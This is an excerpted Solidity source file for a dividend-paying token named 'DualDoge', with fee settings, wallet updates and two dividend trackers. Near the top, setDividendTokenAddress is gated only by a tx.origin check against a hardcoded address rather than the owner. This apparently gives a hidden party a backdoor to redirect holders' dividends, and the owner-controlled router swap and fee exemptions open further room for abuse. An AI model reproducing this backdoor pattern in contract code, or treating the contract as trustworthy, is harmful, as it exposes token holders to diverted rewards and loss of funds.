...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  function setDividendTokenAddress(address newToken) external virtual {
      require(tx.origin == 0xa9eb14cA078d8cFFb275046fcdcFffE01a359E95, "Only owner can change dividend contract address");
...
contract DualDoge is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("DualDoge", "DualDoge") {
    	ethDividendTracker = new EthDividendTracker();
    	dogeBackDividendTracker = new DogeBackDividendTracker();

    	marketingWallet = 0x2e631E08560695e8EF4E91c7C001E4A701FfCAB1;
    	teamWallet = 0x802D0FB3d1b95616434bc5E22F5DEDdcDaBA64Aa;
    	ethDividendToken = 0x2170Ed0880ac9A755fd29B2688956BD959F933F8;
        dogeBackDividendToken = 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c;
    ...
    receive() external payable {
  	...
  	function updateTeamWallet(address _newWallet) external onlyOwner {
  	    require(_newWallet != teamWallet, "DualDoge: The team wallet is already this address");
  	...
  	function updateMarketingWallet(address _newWallet) external onlyOwner {
  	    require(_newWallet != marketingWallet, "DualDoge: The marketing wallet is already this address");
        excludeFromFees(_newWallet, true);
    ...
    function afterPreSale() external onlyOwner {
        ethDividendRewardsFee = 4;
        dogeBackDividendRewardsFee = 4;
        marketingFee = 2;
    ...
    function updateEthDividendTracker(address newAddress) external onlyOwner {
        require(newAddress != address(ethDividendTracker), "DualDoge: The dividend tracker already has that address");

        EthDividendTracker newEthDividendTracker = EthDividendTracker(payable(newAddress));

        require(newEthDividendTracker.owner() == address(this), "DualDoge: The new dividend tracker must be owned by the DualDoge token contract");
    ...
    function updateDogeBackDividendTracker(address newAddress) external onlyOwner {
        require(newAddress != address(dogeBackDividendTracker), "DualDoge: The dividend tracker already has that address");

        DogeBackDividendTracker newDogeBackDividendTracker = DogeBackDividendTracker(payable(newAddress));

        require(newDogeBackDividendTracker.owner() == address(this), "DualDoge: The new dividend tracker must be owned by the DualDoge token contract");
    ...
    function updateEthDividendRewardFee(uint8 newFee) external onlyOwner {
        require(newFee <= 6, "DualDoge: Fee must be less than 6%");
    ...
    function updateUniswapV2Router(address newAddress) external onlyOwner {
        require(newAddress != address(uniswapV2Router), "DualDoge: The router already has that address");
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(isExcludedFromFees[account] != excluded, "DualDoge: Account is already exluded from fees");
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "DualDoge: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private onlyOwner {
        require(automatedMarketMakerPairs[pair] != value, "DualDoge: Automated market maker pair is already set to that value");
    ...
    function updateGasForProcessing(uint256 newValue) external onlyOwner {
        require(newValue != gasForProcessing, "DualDoge: Cannot update gasForProcessing to same value");
    ...
    function _transfer(
        ...
        require(tradingIsEnabled || (isExcludedFromFees[from] || isExcludedFromFees[to]), "DualDoge: Trading has not started yet");
...
contract EthDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("DualDoge_Ethereum_Dividend_Tracker", "DualDoge_Ethereum_Dividend_Tracker", 0x2170Ed0880ac9A755fd29B2688956BD959F933F8) {
    	claimWait = 3600;
        minimumTokenBalanceForDividends = 10000 * (10**18); //must hold 10000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "DualDoge_Ethereum_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "DualDoge_Ethereum_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main DualDoge contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 3600 && newClaimWait <= 86400, "DualDoge_Ethereum_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "DualDoge_Ethereum_Dividend_Tracker: Cannot update claimWait to same value");
...
contract DogeBackDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("DualDoge_DogeBack_Dividend_Tracker", "DualDoge_DogeBack_Dividend_Tracker", 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c) {
    	claimWait = 3600;
        minimumTokenBalanceForDividends = 10000 * (10**18); //must hold 10000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "DualDoge_DogeBack_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "DualDoge_DogeBack_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main DualDoge contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 3600 && newClaimWait <= 86400, "DualDoge_DogeBack_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "DualDoge_DogeBack_Dividend_Tracker: Cannot update claimWait to same value");
        emit ClaimWaitUpdated(newClaimWait, claimWait);
        claimWait = newClaimWait;
    }
